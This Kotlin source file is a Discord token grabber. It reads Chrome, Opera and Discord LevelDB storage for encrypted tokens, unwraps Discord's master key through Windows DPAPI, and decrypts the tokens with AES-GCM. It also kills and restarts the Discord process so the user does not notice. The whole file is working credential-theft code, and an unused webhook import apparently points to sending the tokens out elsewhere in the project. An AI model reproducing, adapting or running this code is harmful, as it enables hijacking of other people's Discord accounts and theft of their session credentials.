package services.discord

import com.sun.jna.platform.win32.Crypt32Util
import org.json.JSONObject
import services.Discord
import utils.DiscordWebhook
import java.io.BufferedReader
import java.io.File
import java.io.FileReader
import java.io.InputStreamReader
import java.util.*
import java.util.regex.Pattern
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

object TokenGrabber {
    val romaing = System.getenv("APPDATA")

    fun getTokens(): List<String>? { // TODO: forced / non-forced (via args)
        val wasRunning = killProcess()

        val key = getKey()
        val tokens = getTokensFromFile()
        if (key == null) return null
        val decryptedTokens = LinkedList<String>()
        for (s in tokens) {
            val z = Base64.getDecoder().decode(key)
            val y = z.copyOfRange(5, z.size)
            decryptedTokens.add(decrypt(Base64.getDecoder().decode(s), y))
        }

        if (wasRunning) restartProcess()

        return decryptedTokens
    }

    private fun getTokensFromFile(): List<String> {
        val tokens = LinkedList<String>()
        val regex = "dQw4w9WgXcQ:"
        val paths = listOf(
            System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb",
            System.getProperty("user.home") + "/AppData/Local/Opera Software/Opera Stable/Local Storage/leveldb",
            "$romaing/discord/Local Storage/leveldb",
        )

        paths.forEach { path ->
            val files = File(path).listFiles()
            files?.forEach { file ->
                BufferedReader(FileReader(file)).use { br ->
                    var line: String?
                    while (br.readLine().also { line = it } != null) {
                        if (line!!.contains(regex)) tokens.add(line.split(regex)[1].split("\"")[0])
                    }
                }
            }
        }
        return tokens
    }

    private fun getKey(): String? {
        BufferedReader(FileReader(File("$romaing\\discord\\Local State"))).use { brs ->
            var line: String?
            while (brs.readLine().also { line = it } != null) {
                return JSONObject(line).getJSONObject("os_crypt").getString("encrypted_key")
            }
        }
        return null
    }

    private fun decrypt(token: ByteArray, key: ByteArray): String {
        val finalKey = Crypt32Util.cryptUnprotectData(key)
        val finalToken = ByteArray(12) { i -> token[i + 3] }
        val data = ByteArray(token.size - 15) { i -> token[i + 15] }
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(finalKey, "AES"), GCMParameterSpec(128, finalToken))
        return String(cipher.doFinal(data))
    }

    private fun killProcess(): Boolean {
        try {
            val process = ProcessBuilder("tasklist").start()
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            if (reader.lines().anyMatch { it.contains("Discord") }) {
                ProcessBuilder("taskkill", "/F", "/IM", "discord.exe").start().waitFor()
                return true
            }

        } catch (_: Exception) {}
        return false
    }

    private fun restartProcess() {
        val dir = System.getProperty("user.home") + "/AppData/Local/Discord"
        val update = "$dir/Update.exe"
        var executable = "Discord.exe"

        val directory = File(System.getProperty("user.home") + "/AppData/Local/Discord")
        if (directory.exists() && directory.isDirectory) {
            val appPattern = Pattern.compile("app-+?")
            directory.listFiles()?.forEach { file ->
                if (appPattern.matcher(file.name).find()) {
                    val app = file.path
                    val modulesDir = File(app, "modules")
                    if (modulesDir.exists()) {
                        File(app).listFiles()?.forEach { innerFile ->
                            if (innerFile.name == executable) {
                                executable = File(app, executable).path
                                // Start the process
                                try {
                                    ProcessBuilder(update, "--processStart", executable)
                                        .redirectErrorStream(true)
                                        .start()
                                        .waitFor()
                                } catch (e: Exception) {
                                    println("Error starting Discord: ${e.message}")
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

fun main() {
    println(TokenGrabber.getTokens())
}